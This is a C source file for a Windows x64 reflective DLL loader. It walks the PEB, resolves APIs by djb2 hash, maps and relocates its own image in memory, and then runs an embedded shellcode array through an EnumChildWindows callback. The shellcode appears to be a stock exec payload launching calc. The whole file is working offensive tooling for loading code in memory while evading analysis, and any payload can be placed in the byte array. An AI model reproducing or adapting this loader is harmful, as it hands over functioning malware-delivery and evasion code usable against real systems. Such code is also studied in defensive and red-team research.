#include <Windows.h>
#include <intrin.h>

#pragma comment(linker, "/NODEFAULTLIB")
#pragma comment(linker, "/ENTRY:ReflectiveLoader")

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }



typedef struct _UNICODE_STRING {
    USHORT Length;                             // +0x00
    USHORT MaximumLength;                      // +0x02
    PWSTR  Buffer;                             // +0x08
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;                                // +0x00
    UCHAR Initialized;                           // +0x04
    PVOID SsHandle;                              // +0x08
    LIST_ENTRY InLoadOrderModuleList;            // +0x10
    LIST_ENTRY InMemoryOrderModuleList;          // +0x20
    LIST_ENTRY InInitializationOrderModuleList;  // +0x30
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;               // +0x00
    LIST_ENTRY InMemoryOrderLinks;             // +0x10
    LIST_ENTRY InInitializationOrderLinks;     // +0x20
    PVOID DllBase;                             // +0x30
    PVOID EntryPoint;                          // +0x38
    ULONG SizeOfImage;                         // +0x40
    UNICODE_STRING FullDllName;                // +0x48
    UNICODE_STRING BaseDllName;                // +0x58
    ULONG Flags;                               // +0x68
    USHORT LoadCount;                          // +0x6C
    USHORT TlsIndex;                           // +0x6E
    LIST_ENTRY HashLinks;                      // +0x70
    ULONG TimeDateStamp;                       // +0x80
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PPEB_LDR_DATA                 Ldr;
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                         Reserved4[3];
    PVOID                         AtlThunkSListPtr;
    PVOID                         Reserved5;
    ULONG                         Reserved6;
    PVOID                         Reserved7;
    ULONG                         Reserved8;
    ULONG                         AtlThunkSListPtr32;
    PVOID                         Reserved9[45];
    BYTE                          Reserved10[96];
    BYTE                          Reserved11[128];
    PVOID                         Reserved12[1];
    ULONG                         SessionId;
} PEB, * PPEB;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);

typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);

typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

typedef BOOL(WINAPI* PDLLMAIN)(HMODULE, DWORD, LPVOID);

/*------------------------------------------------------------------------------------------[Structs]-------------------------------------------------------------------------------------*/

#pragma function(_wcsicmp)
int _wcsicmp(const wchar_t* a, const wchar_t* b)
{
	while (*a && *b)
	{
		wchar_t ca = *a >= L'a' && *a <= L'z' ? *a - 32 : *a;
		wchar_t cb = *b >= L'a' && *b <= L'z' ? *b - 32 : *b;
		if (ca != cb) return ca - cb;
		a++; b++;
	}
	return *a - *b;
}

#pragma function(memset)
void* memset(void* dst, int val, size_t size)
{
	unsigned char* p = (unsigned char*)dst;
	while (size--) *p++ = (unsigned char)val;
	return dst;
}

#pragma function(memcpy)
void* memcpy(void* dst, const void* src, size_t size)
{
	unsigned char* d = (unsigned char*)dst;
	const unsigned char* s = (const unsigned char*)src;
	while (size--) *d++ = *s++;
	return dst;
}

/*---------------------------------------------------------------------------------------[LINK2001]---------------------------------------------------------------------------------------*/

PVOID pMemcpy
(
	IN PVOID Destination,
	IN const PVOID Source,
	IN SIZE_T Size
)
{

	if (!Destination || !Source || Size <= 0)
		return NULL;

	UCHAR* cDestination = Destination;
	const UCHAR* cSource = Source;

	for (size_t i = 0; i < Size; i++)
	{
		cDestination[i] = cSource[i];
	}

	return Destination;

}

/*---------------------------------------------------------------------------------------[Custom Memcpy]------------------------------------------------------------------------------------------*/

PVOID GetModuleHandleH
(
	IN wchar_t* target
)
{

	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;

	PLIST_ENTRY head = &pLdr->InLoadOrderModuleList;

	for (PLIST_ENTRY pList = head->Flink; pList != head; pList = pList->Flink)
	{

		PLDR_DATA_TABLE_ENTRY ModuleDll =
			CONTAINING_RECORD(
				pList,
				LDR_DATA_TABLE_ENTRY,
				InLoadOrderLinks
			);

		if (_wcsicmp(ModuleDll->BaseDllName.Buffer, target) == 0)
		{
			return ModuleDll->DllBase;
		}
	}


	return NULL;
}

DWORD djb2
(
	IN PCHAR String
)
{
	if (!String)
		return 0;

	DWORD hash = 5381;
	UINT i = 0;

	while (String[i])
	{
		UCHAR c = (UCHAR)String[i];

		hash = ((hash << 5) + hash) + c; // hash * 33 + c

		i++;
	}

	return hash;
}

PVOID GetHashAddress
(
	IN PVOID BaseAddress,
	IN DWORD ApiHash
)

{

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)BaseAddress;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}

	PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)BaseAddress + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	PIMAGE_OPTIONAL_HEADER pImgOpt = (PIMAGE_OPTIONAL_HEADER)&pImgNt->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY pImgExport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseAddress + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD Address = (PDWORD)((LPBYTE)BaseAddress + pImgExport->AddressOfFunctions);
	PDWORD Name = (PDWORD)((LPBYTE)BaseAddress + pImgExport->AddressOfNames);
	PWORD Ordinal = (PWORD)((LPBYTE)BaseAddress + pImgExport->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExport->NumberOfNames; i++)
	{


		CHAR* FuncName = (CHAR*)BaseAddress + Name[i];

		if (ApiHash != djb2(FuncName))
			continue;
		WORD ord = Ordinal[i];
		PVOID FuncAddr = (LPBYTE)BaseAddress + Address[ord];
		return FuncAddr;
	}

	return NULL;

}

/*-------------------------------------------------------------------------------------------[API Hashing + PEB Loading]--------------------------------------------------------------------------------*/

BOOL fixReloc
(
	IN DWORD RelocRVA,
	IN PVOID PeBase,
	IN DWORD_PTR dwDelta
)
{

	if (!PeBase || RelocRVA == 0)
		return FALSE;

	if (RelocRVA)
	{

		PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)PeBase + RelocRVA);

		while (Reloc->VirtualAddress)
		{
			DWORD size = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(Reloc + 1);

			for (DWORD i = 0; i < size; i++)
			{
				if (relocationRVA[i].Type == IMAGE_REL_BASED_DIR64)
				{
					ULONGLONG* PatchedAddress = (ULONGLONG*)((PBYTE)PeBase + Reloc->VirtualAddress + relocationRVA[i].Offset);
					*PatchedAddress += (ULONGLONG)dwDelta;
				}
			}
			Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);
		}
	}

	return TRUE;

}

/*----------------------------------------------------------------------------[Fix Relocations]-------------------------------------------------------------------------------------------------------*/

BOOL FixIAT
(
	IN DWORD ImportRva,
	IN PBYTE PeBase
)
{

	pLoadLibraryA     fnLoadLibraryA = NULL;
	pGetProcAddress   fnGetProcAddress = NULL;

	fnLoadLibraryA = (pLoadLibraryA)GetHashAddress(GetModuleHandleH(L"kernel32.dll"), djb2("LoadLibraryA"));

	fnGetProcAddress = (pGetProcAddress)GetHashAddress(GetModuleHandleH(L"kernel32.dll"), djb2("GetProcAddress"));

	if (ImportRva)
	{
		PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(PeBase + ImportRva);

		while (pImport->Name)
		{
			HMODULE hDll = fnLoadLibraryA((LPCSTR)(PeBase + pImport->Name));

			if (hDll)
			{
				PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(PeBase + pImport->FirstThunk);
				PIMAGE_THUNK_DATA pOriginalThunk = pImport->OriginalFirstThunk ?
					(PIMAGE_THUNK_DATA)(PeBase + pImport->OriginalFirstThunk) : pFirstThunk;

				while (pOriginalThunk->u1.AddressOfData)
				{
					FARPROC func = 0;

					if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal))
						func = fnGetProcAddress(hDll, (LPCSTR)(pOriginalThunk->u1.Ordinal & 0xFFFF));
					else
					{
						PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(PeBase + pOriginalThunk->u1.AddressOfData);
						func = fnGetProcAddress(hDll, pName->Name);
					}
					pFirstThunk->u1.Function = (ULONG_PTR)func;
					pFirstThunk++;
					pOriginalThunk++;
				}
			}

			pImport++;
		}
	}

	return TRUE;
}

/*---------------------------------------------------------------------------------------[Fix Import Address Table]---------------------------------------------------------------------------------*/


__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
{


	PIMAGE_DOS_HEADER pImgDos = NULL;
	PIMAGE_NT_HEADERS64 pImgNt = NULL;
	PIMAGE_DATA_DIRECTORY pImgDir = NULL;
	PBYTE PeBase = NULL;
	PBYTE ReflectiveDllBase = NULL;
	pVirtualProtect   fnVirtualProtect = NULL;
	pVirtualAlloc     fnVirtualAlloc = NULL;
	pGetProcAddress   fnGetProcAddress = NULL;


	DWORD dwProt = 0;

	// Find our own base address
	ULONG_PTR currentAddr = caller();

	do
	{
		pImgDos = (PIMAGE_DOS_HEADER)currentAddr;

		if (pImgDos->e_magic == IMAGE_DOS_SIGNATURE)
		{
			pImgNt = (PIMAGE_NT_HEADERS64)(currentAddr + pImgDos->e_lfanew);

			if (pImgNt->Signature == IMAGE_NT_SIGNATURE)
			{
				ReflectiveDllBase = (PBYTE)currentAddr;
				break;
			}
		}

		currentAddr -= 0x1000;
	} while (TRUE);

	if (!ReflectiveDllBase)
		return FALSE;

	//return 0x293939;

	// Get function pointers
	if (!(fnGetProcAddress = (pGetProcAddress)GetHashAddress(GetModuleHandleH(L"kernel32.dll"), djb2("GetProcAddress"))))
	{
		return FALSE;
	}

	//return 0x939393;

	if (!(fnVirtualAlloc = (pVirtualAlloc)fnGetProcAddress(GetModuleHandleH(L"kernel32.dll"), "VirtualAlloc")))
	{
		return FALSE;
	}

	if (!(fnVirtualProtect = (pVirtualProtect)fnGetProcAddress(GetModuleHandleH(L"kernel32.dll"), "VirtualProtect")))
	{
		return FALSE;
	}

	// Allocate memory
	if (!(PeBase = fnVirtualAlloc(NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
	{
		return FALSE;
	}

	// Copy headers
	pMemcpy(PeBase, ReflectiveDllBase, pImgNt->OptionalHeader.SizeOfHeaders);

	// Copy sections
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pImgNt);
	for (WORD i = 0; i < pImgNt->FileHeader.NumberOfSections; i++, pSection++)
	{
		if (pSection->SizeOfRawData == 0)
			continue;

		pMemcpy(
			(PVOID)(PeBase + pSection->VirtualAddress),
			(PVOID)(ReflectiveDllBase + pSection->PointerToRawData),
			pSection->SizeOfRawData
		);
	}

	PIMAGE_NT_HEADERS64 pImgNtNew = (PIMAGE_NT_HEADERS64)(PeBase + pImgDos->e_lfanew);
	if (pImgNtNew->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;
	if (pImgNtNew->OptionalHeader.ImageBase == 0)
		return FALSE;

	// Fix relocations
	DWORD_PTR dwDelta = (DWORD_PTR)PeBase - (DWORD_PTR)pImgNtNew->OptionalHeader.ImageBase;

	if (dwDelta != 0)
	{
		DWORD RelocRVA = pImgNtNew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		if (RelocRVA && !fixReloc(RelocRVA, PeBase, dwDelta))
		{
			return FALSE;
		}
	}

	DWORD importRva = pImgNtNew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	// Fix IAT
	if (!FixIAT(importRva, PeBase))
	{
		return FALSE;
	}

	// Set protections
	pSection = IMAGE_FIRST_SECTION(pImgNtNew);
	for (WORD i = 0; i < pImgNtNew->FileHeader.NumberOfSections; i++, pSection++)
	{
		if (pSection->SizeOfRawData == 0)
			continue;

		if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProt = (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
		else
			dwProt = (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;

		PVOID SecBaseAddress = (PVOID)(PeBase + pSection->VirtualAddress);
		SIZE_T size = pSection->Misc.VirtualSize;
		DWORD dwOldProt = 0;

		fnVirtualProtect(SecBaseAddress, size, dwProt, &dwOldProt);
	}

	// Call DllMain
	PDLLMAIN pDllMain = (PDLLMAIN)(PeBase + pImgNtNew->OptionalHeader.AddressOfEntryPoint);
	pDllMain((HMODULE)PeBase, DLL_PROCESS_ATTACH, NULL);

	return TRUE;
}

/*-----------------------------------------------------------------------------------------[Reflective Loader Function]-------------------------------------------------------------------------------*/

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

VOID Hello() {
	EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL);
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		Hello();
		break;
	}
	return TRUE;
}

/*---------------------------------------------------------------------------------------------[DLL Main]--------------------------------------------------------------------------------------------------------*/